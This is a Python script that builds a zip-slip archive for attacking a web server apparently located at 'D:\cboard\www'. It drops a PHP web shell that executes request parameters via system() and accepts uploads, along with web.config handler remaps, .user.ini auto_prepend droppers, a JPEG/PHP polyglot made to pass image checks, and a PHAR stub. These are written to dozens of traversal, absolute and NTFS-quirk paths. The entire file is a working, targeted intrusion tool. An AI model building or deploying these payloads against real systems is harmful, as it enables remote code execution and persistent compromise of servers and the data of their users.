#!/usr/bin/env python3
"""
Build a zip-slip payload zip stacked with:
  - PHP shells at many candidate paths (relative traversal + absolute Windows)
  - web.config dropped at many candidate docroot locations
  - .user.ini auto_prepend_file droppers
  - A polyglot JPEG+PHP file (for auto_prepend_file target, or any LFI/phar sink)
  - A PHAR polyglot stub (rename to your needs; for phar:// sinks)

Each entry's body contains a unique tag so you can identify the winner.
"""
import zipfile, struct, os

OUT = "payload2.zip"

# ---- Payloads ----------------------------------------------------------------

PHP_SHELL = b'''<?php
// TAG:%s
if (isset($_REQUEST["c"])) { echo "<pre>"; system($_REQUEST["c"]); echo "</pre>"; }
if (isset($_REQUEST["u"])) {  // upload secondary
    file_put_contents($_REQUEST["u"], file_get_contents("php://input"));
    echo "ok";
}
?>'''

# web.config that maps *.txt to the PHP CGI handler.
# Adjust scriptProcessor if you find the real PHP path (errors, phpinfo, etc.).
WEB_CONFIG = b'''<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="z1" path="*.zzz" verb="*" modules="IsapiModule"
           scriptProcessor="C:\\Program Files\\PHP\\v7.4\\php-cgi.exe"
           resourceType="Unspecified" requireAccess="Script"
           preCondition="bitness64" />
      <add name="z2" path="*.zzz" verb="*" modules="IsapiModule"
           scriptProcessor="C:\\Program Files (x86)\\PHP\\v7.4\\php-cgi.exe"
           resourceType="Unspecified" requireAccess="Script"
           preCondition="bitness32" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions><remove fileExtension=".zzz"/></fileExtensions>
        <hiddenSegments><clear/></hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
'''

# .user.ini — when PHP is CGI/FastCGI, auto_prepend includes our polyglot
# before every PHP page. Cached for ~user_ini.cache_ttl (default 300s).
def user_ini(prepend_path):
    return f'auto_prepend_file = "{prepend_path}"\n'.encode()

# A JPEG that contains PHP code in the EXIF comment area.
# The leading FFD8FFE0 + JFIF segment makes magic-byte / getimagesize checks pass.
def jpeg_php_polyglot(php_body):
    # JPEG SOI + APP0 (JFIF) header
    header = bytes.fromhex("FFD8FFE0") + struct.pack(">H", 16) + b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    # COM segment containing PHP. Size includes the 2 size bytes.
    com_payload = b"<?php " + php_body + b" ?>"
    com_seg = bytes.fromhex("FFFE") + struct.pack(">H", len(com_payload) + 2) + com_payload
    # Minimal SOS + EOI so it still scans as a "valid-ish" JPEG.
    body = bytes.fromhex("FFDB004300") + (b"\x10" * 64)  # DQT
    body += bytes.fromhex("FFC0000B080001000101011100")    # SOF0 (1x1)
    body += bytes.fromhex("FFDA0008010100003F00")          # SOS
    body += b"\x00"                                        # tiny entropy
    body += bytes.fromhex("FFD9")                          # EOI
    return header + com_seg + body

JPEG_POLY = jpeg_php_polyglot(b'if(isset($_REQUEST["c"])){system($_REQUEST["c"]);}')

# PHAR polyglot stub — replace with phpggc-generated content for real gadget chains.
# Useful only if something on the server calls a file fn with phar:// on this path.
PHAR_STUB = (
    b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"<?php __HALT_COMPILER(); ?>\r\n"
    # NOTE: this is a placeholder. For real exploitation, generate with:
    #   phpggc -p phar -pj cover.jpg <Chain> <args>
    # and paste the bytes here.
)

# ---- Path candidates ---------------------------------------------------------

# Based on intel:
#   D:\cboard\www\index.php          <- docroot
#   D:\cboard\appl\framework_5.13.1\ <- framework files
#   PHP temp: C:\Windows\TEMP

# Plausible docroot drop targets for shell.php
SHELL_PATHS = [
    # plain (cwd of extractor)
    "shell_52631.php",
    "./shell_52631.php",

    # progressively deeper traversal — covers extractor CWD 1..10 deep
    *[("../" * n) + "shell_52631.php" for n in range(1, 11)],
    *[("..\\" * n) + "shell_52631.php" for n in range(1, 11)],

    # absolute paths on D: (docroot)
    "D:/cboard/www/shell_52631.php",
    "D:\\cboard\\www\\shell_52631.php",
    "/cboard/www/shell_52631.php",
    "\\cboard\\www\\shell_52631.php",
    "D:/cboard/www/uploads/shell_52631.php",
    "D:/cboard/www/files/shell_52631.php",
    "D:/cboard/www/tmp/shell_52631.php",
    "D:/cboard/www/public/shell_52631.php",
    "D:/cboard/www/static/shell_52631.php",
    "D:/cboard/www/assets/shell_52631.php",
    "D:/cboard/appl/framework_5.13.1/phpfiles/shell_52631.php",

    # traversal that ends in the docroot from common upload locations
    "../../www/shell_52631.php",
    "../../../www/shell_52631.php",
    "../../../../cboard/www/shell_52631.php",
    "../../../../../cboard/www/shell_52631.php",

    # absolute C: in case there's a separate IIS docroot
    "C:/inetpub/wwwroot/shell_52631.php",
    "C:\\inetpub\\wwwroot\\shell_52631.php",

    # NTFS quirks — trailing dot/space, ADS
    "D:/cboard/www/shell_52631.php.",
    "D:/cboard/www/shell_52631.php ",
    "D:/cboard/www/shell_52631.php::$DATA",

    # alternate extensions in case .php is blocked but other handlers exist
    "D:/cboard/www/shell_52631.phtml",
    "D:/cboard/www/shell_52631.phar",
    "D:/cboard/www/shell_52631.php5",
    "D:/cboard/www/shell_52631.php7",
    "D:/cboard/www/shell_52631.pht",
]

# web.config drop locations
WEBCONFIG_PATHS = [
    "web.config",
    "../web.config",
    "../../web.config",
    "../../../web.config",
    "../../../../web.config",
    "D:/cboard/www/web.config",
    "D:\\cboard\\www\\web.config",
    "D:/cboard/www/uploads/web.config",
    "D:/cboard/www/files/web.config",
    "C:/inetpub/wwwroot/web.config",
]

# .user.ini drops — point auto_prepend at our polyglot JPEG which we also drop in uploads
USERINI_PREPEND_TARGETS = [
    "D:\\cboard\\www\\uploads\\cover_52631.jpg",
    "D:\\cboard\\www\\files\\cover_52631.jpg",
    "D:\\cboard\\www\\cover_52631.jpg",
]
USERINI_PATHS = [
    ".user.ini",
    "../.user.ini",
    "../../.user.ini",
    "../../../.user.ini",
    "D:/cboard/www/.user.ini",
    "D:\\cboard\\www\\.user.ini",
    "D:/cboard/www/uploads/.user.ini",
]

# JPEG polyglot drops (so .user.ini has something to include)
JPEG_PATHS = [
    "cover_52631.jpg",
    "D:/cboard/www/uploads/cover_52631.jpg",
    "D:/cboard/www/files/cover_52631.jpg",
    "D:/cboard/www/cover_52631.jpg",
    "D:\\cboard\\www\\uploads\\cover_52631.jpg",
]

# PHAR polyglot drops — name them as innocent extensions so file-fn sinks pick them up
PHAR_PATHS = [
    "cover2_52631.jpg",
    "D:/cboard/www/uploads/cover2_52631.jpg",
    "D:/cboard/www/files/cover2_52631.jpg",
]

# ---- Build the zip -----------------------------------------------------------

def add(zf, name, data, idx):
    """
    Add entry forcing both create_system variants so Windows libs don't
    pre-normalize the path. Use STORED (no compression) for speed/clarity.
    """
    info = zipfile.ZipInfo(name)
    info.compress_type = zipfile.ZIP_STORED
    info.create_system = 0  # FAT/Windows
    info.external_attr = 0o644 << 16
    try:
        zf.writestr(info, data)
    except Exception as e:
        print(f"[!] skipped {name!r}: {e}")

with zipfile.ZipFile(OUT, "w") as z:
    i = 0

    for p in SHELL_PATHS:
        tag = f"SHELL_{i}_{p}".encode()
        add(z, p, PHP_SHELL % tag, i)
        i += 1

    for p in WEBCONFIG_PATHS:
        add(z, p, WEB_CONFIG, i); i += 1

    for prepend_target in USERINI_PREPEND_TARGETS:
        body = user_ini(prepend_target)
        for p in USERINI_PATHS:
            # de-dupe by encoding target in entry name suffix that gets normalized away
            name = p
            add(z, name, body, i); i += 1

    for p in JPEG_PATHS:
        add(z, p, JPEG_POLY, i); i += 1

    for p in PHAR_PATHS:
        add(z, p, PHAR_STUB, i); i += 1

print(f"[+] wrote {OUT} with {i} entries")
print(f"[+] size: {os.path.getsize(OUT)} bytes")